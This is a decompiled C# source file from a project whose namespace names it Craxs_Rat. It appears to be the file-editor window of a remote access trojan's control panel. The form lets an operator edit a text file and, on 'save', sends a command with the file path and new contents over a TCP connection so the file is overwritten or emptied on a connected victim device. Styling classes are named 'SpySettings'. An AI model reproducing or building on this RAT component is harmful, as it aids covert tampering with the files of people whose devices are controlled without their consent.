using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Craxs_Rat.sockets;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class Editor : Form
{
	private IContainer components;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("EditText")]
	private RichTextBox _EditText;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("b_ok")]
	private Button _b_ok;

	[AccessedThroughProperty("TOpacity")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Timer _TOpacity;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CutToolStripMenuItem")]
	private ToolStripMenuItem _CutToolStripMenuItem;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("CopyToolStripMenuItem")]
	private ToolStripMenuItem _CopyToolStripMenuItem;

	[AccessedThroughProperty("PasteToolStripMenuItem")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _PasteToolStripMenuItem;

	public TcpClient Client;

	public Client classClient;

	public bool status;

	public string path;

	public string Title;

	internal virtual RichTextBox EditText
	{
		[CompilerGenerated]
		get
		{
			return _EditText;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = EditText_TextChanged;
			RichTextBox richTextBox = _EditText;
			if (richTextBox != null)
			{
				richTextBox.TextChanged -= value2;
			}
			_EditText = value;
			richTextBox = _EditText;
			if (richTextBox != null)
			{
				richTextBox.TextChanged += value2;
			}
		}
	}

	internal virtual Button b_ok
	{
		[CompilerGenerated]
		get
		{
			return _b_ok;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = b_ok_Click;
			Button button = _b_ok;
			if (button != null)
			{
				button.Click -= value2;
			}
			_b_ok = value;
			button = _b_ok;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer TOpacity
	{
		[CompilerGenerated]
		get
		{
			return _TOpacity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TOpacity_Tick;
			Timer timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_TOpacity = value;
			timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("CMenu")]
	internal virtual ContextMenuStrip CMenu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem CutToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _CutToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CutToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _CutToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CutToolStripMenuItem = value;
			toolStripMenuItem = _CutToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem CopyToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _CopyToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CopyToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _CopyToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CopyToolStripMenuItem = value;
			toolStripMenuItem = _CopyToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem PasteToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _PasteToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = PasteToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _PasteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_PasteToolStripMenuItem = value;
			toolStripMenuItem = _PasteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.EditText = new System.Windows.Forms.RichTextBox();
		this.b_ok = new System.Windows.Forms.Button();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.CMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.CutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.CopyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PasteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.Panel1.SuspendLayout();
		this.CMenu.SuspendLayout();
		base.SuspendLayout();
		this.EditText.BackColor = System.Drawing.Color.Black;
		this.EditText.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.EditText.Dock = System.Windows.Forms.DockStyle.Fill;
		this.EditText.ForeColor = System.Drawing.Color.FromArgb(190, 190, 190);
		this.EditText.Location = new System.Drawing.Point(0, 0);
		this.EditText.Name = "EditText";
		this.EditText.Size = new System.Drawing.Size(414, 213);
		this.EditText.TabIndex = 1;
		this.EditText.Text = "";
		this.EditText.WordWrap = false;
		this.b_ok.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
		this.b_ok.BackColor = System.Drawing.Color.FromArgb(190, 190, 190);
		this.b_ok.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.b_ok.ForeColor = System.Drawing.Color.Black;
		this.b_ok.Location = new System.Drawing.Point(343, 3);
		this.b_ok.Name = "b_ok";
		this.b_ok.Size = new System.Drawing.Size(67, 23);
		this.b_ok.TabIndex = 2;
		this.b_ok.Text = "save";
		this.b_ok.UseVisualStyleBackColor = false;
		this.b_ok.Visible = false;
		this.Panel1.BackColor = System.Drawing.Color.Black;
		this.Panel1.Controls.Add(this.b_ok);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel1.ForeColor = System.Drawing.Color.FromArgb(190, 190, 190);
		this.Panel1.Location = new System.Drawing.Point(0, 213);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(414, 28);
		this.Panel1.TabIndex = 3;
		this.TOpacity.Interval = 1;
		this.CMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.CutToolStripMenuItem, this.CopyToolStripMenuItem, this.PasteToolStripMenuItem });
		this.CMenu.Name = "CMenu";
		this.CMenu.ShowImageMargin = false;
		this.CMenu.Size = new System.Drawing.Size(156, 92);
		this.CutToolStripMenuItem.Name = "CutToolStripMenuItem";
		this.CutToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
		this.CutToolStripMenuItem.Text = "Cut";
		this.CopyToolStripMenuItem.Name = "CopyToolStripMenuItem";
		this.CopyToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
		this.CopyToolStripMenuItem.Text = "Copy";
		this.PasteToolStripMenuItem.Name = "PasteToolStripMenuItem";
		this.PasteToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
		this.PasteToolStripMenuItem.Text = "Paste";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(414, 241);
		base.Controls.Add(this.EditText);
		base.Controls.Add(this.Panel1);
		base.Name = "Editor";
		base.Opacity = 0.0;
		this.Text = "Editor";
		this.Panel1.ResumeLayout(false);
		this.CMenu.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public Editor()
	{
		base.Load += Editor_Load;
		base.Activated += Editor_Activated;
		path = null;
		Title = "null";
		InitializeComponent();
		Font = reso.f;
	}

	private void SpyStyle()
	{
		foreach (Button item in Panel1.Controls.OfType<Button>())
		{
			item.BackColor = SpySettings.DefaultColor_Foreground;
			item.ForeColor = SpySettings.DefaultColor_Background;
		}
		foreach (RichTextBox item2 in base.Controls.OfType<RichTextBox>())
		{
			item2.ForeColor = SpySettings.DefaultColor_Foreground;
			item2.BackColor = SpySettings.DefaultColor_Background;
		}
		foreach (Panel item3 in base.Controls.OfType<Panel>())
		{
			item3.BackColor = SpySettings.DefaultColor_Background;
		}
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			TOpacity.Enabled = false;
		}
	}

	private void Editor_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\8.ico");
		SpyStyle();
		EditText.ContextMenuStrip = CMenu;
		Text = Title;
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
	}

	private void EditText_TextChanged(object sender, EventArgs e)
	{
		if (!b_ok.Visible & status)
		{
			b_ok.Visible = true;
		}
	}

	private void Editor_Activated(object sender, EventArgs e)
	{
		status = true;
	}

	private void b_ok_Click(object sender, EventArgs e)
	{
		if ((classClient != null) & (Operators.CompareString(path, null, TextCompare: false) != 0))
		{
			object[] parametersObjects = ((EditText.Text.Length <= 0) ? new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "empty" + Data.SPL_DATA + path,
				Codes.Encoding().GetBytes("null"),
				classClient
			} : new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "save" + Data.SPL_DATA + path + Data.SPL_DATA + EditText.Text,
				Codes.Encoding().GetBytes("null"),
				classClient
			});
			classClient.SendMessage(parametersObjects);
			Close();
		}
	}

	private void CutToolStripMenuItem_Click(object sender, EventArgs e)
	{
		EditText.Cut();
	}

	private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		EditText.Copy();
	}

	private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		EditText.Paste();
	}
}
